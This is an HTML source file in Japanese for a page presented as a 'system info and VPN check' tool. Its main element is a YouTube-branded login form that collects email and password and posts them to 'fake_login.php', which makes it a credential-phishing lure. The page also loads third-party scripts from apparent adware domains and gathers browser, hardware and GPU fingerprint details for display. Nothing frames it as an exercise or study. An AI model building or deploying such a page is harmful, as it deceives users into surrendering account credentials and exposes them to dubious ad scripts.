<!DOCTYPE html>
<html lang="ja">
<head>
  <meta charset="UTF-8">
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  <title>システム情報とVPNチェック</title>
  <link rel="stylesheet" href="styles.css">

  <!-- 広告のスクリプト読み込み -->
  <script async src="//pl25082341.profitablecpmrate.com/aa/3e/93/aa3e9339a9b40453e2e60b8ab027c4d4.js"></script>
  <script async src="//pl25082392.profitablecpmrate.com/2230f4de6975fa6ecbeefbbc53411cf4/invoke.js"></script>
  <script async src="//gappoison.com/2230f4de6975fa6ecbeefbbc53411cf4/invoke.js"></script>
</head>
<body>
  <div class="login-container">
    <div class="login-box">
      <img class="youtube-logo" src="youtube-logo.png" alt="YouTube Logo">
      <h2>ログイン</h2>
      <form action="fake_login.php" method="POST">
        <div class="textbox">
          <input type="email" placeholder="メールアドレス" name="email" required>
        </div>
        <div class="textbox">
          <input type="password" placeholder="パスワード" name="password" required>
        </div>
        <button type="submit" class="btn">ログイン</button>
      </form>

      <!-- IPアドレスとシステム情報表示 -->
      <div class="output">
        <h3>あなたのIPアドレス</h3>
        <p>IPv4: <span id="ipv4">取得中...</span></p>
        <p>IPv6: <span id="ipv6">取得中...</span></p>
        <p>プロバイダー: <span id="provider">取得中...</span></p>
        <p>VPN使用: <span id="vpn-status">確認中...</span></p>
        <button onclick="getIPAddress()" class="btn">IPアドレスを取得</button>
      </div>

      <!-- 広告表示エリア -->
      <div class="ad-container">
        <h3>スポンサーリンク</h3>
        <!-- 広告のコンテナ -->
        <div id="container-2230f4de6975fa6ecbeefbbc53411cf4"></div>
      </div>

      <!-- システム情報 -->
      <div class="system-info">
        <h3>システム情報</h3>
        <p>ブラウザ: <span id="browser">取得中...</span></p>
        <p>OS: <span id="os">取得中...</span></p>
        <p>CPUコア数: <span id="cpu">取得中...</span></p>
        <p>メモリ容量: <span id="memory">取得中...</span></p>
        <p>GPU情報: <span id="gpu">取得中...</span></p>
        <button onclick="getSystemInfo()" class="btn">システム情報を取得</button>
      </div>
    </div>
  </div>

  <script>
    // IPアドレスを取得する関数
    async function getIPAddress() {
      try {
        const response = await fetch("https://ipapi.co/json/");
        const data = await response.json();
        document.getElementById("ipv4").textContent = data.ip || "取得失敗";
        document.getElementById("provider").textContent = data.org || "取得失敗";

        // 簡易VPNチェック
        const vpnStatus = data.security?.vpn ? "使用中" : "未使用";
        document.getElementById("vpn-status").textContent = vpnStatus;
      } catch (error) {
        console.error(error);
      }
    }

    // システム情報を取得する関数
    function getSystemInfo() {
      try {
        // ブラウザ情報
        document.getElementById("browser").textContent = navigator.userAgent;

        // OS情報
        document.getElementById("os").textContent = navigator.platform;

        // CPUコア数
        document.getElementById("cpu").textContent = navigator.hardwareConcurrency || "取得失敗";

        // メモリ情報
        const memory = navigator.deviceMemory ? `${navigator.deviceMemory} GB` : "取得失敗";
        document.getElementById("memory").textContent = memory;

        // GPU情報
        const canvas = document.createElement("canvas");
        const gl = canvas.getContext("webgl");
        const debugInfo = gl.getExtension("WEBGL_debug_renderer_info");
        const gpu = debugInfo ? gl.getParameter(debugInfo.UNMASKED_RENDERER_WEBGL) : "取得失敗";
        document.getElementById("gpu").textContent = gpu;
      } catch (error) {
        console.error(error);
      }
    }
  </script>
</body>
</html>
